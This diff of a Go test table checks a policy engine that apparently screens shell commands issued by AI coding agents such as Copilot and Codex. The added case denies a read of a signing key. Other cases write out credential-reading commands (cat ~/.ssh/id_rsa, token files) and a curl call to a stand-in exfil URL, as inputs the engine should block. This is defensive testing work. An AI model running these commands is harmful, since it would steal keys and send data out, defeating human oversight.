@@ -40,6 +40,7 @@ func TestGuardLayersOverOpenClawProfile(t *testing.T) {
 		{name: "privileged change", tool: "exec", params: map[string]any{"command": "sudo apt update", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
 		{name: "credential shell read", tool: "exec", params: map[string]any{"command": "cat ~/.ssh/id_rsa", "rampart_integration": "openclaw"}, want: engine.ActionDeny},
 		{name: "Rampart token shell read", tool: "exec", params: map[string]any{"command": "cat ~/.rampart/token", "rampart_integration": "openclaw"}, want: engine.ActionDeny},
+		{name: "Rampart signing key shell read", tool: "exec", params: map[string]any{"command": "cat ~/.rampart/signing.key", "rampart_integration": "openclaw"}, want: engine.ActionDeny},
 		{name: "external curl", tool: "exec", params: map[string]any{"command": "curl https://example.invalid/exfil", "rampart_integration": "openclaw"}, want: engine.ActionDeny},
 		{name: "Copilot external curl", agent: "github-copilot", tool: "exec", params: map[string]any{"command": "curl https://example.invalid/exfil"}, want: engine.ActionDeny},
 		{name: "Codex credential shell read", agent: "codex", tool: "exec", params: map[string]any{"command": "cat ~/.ssh/id_rsa"}, want: engine.ActionDeny},
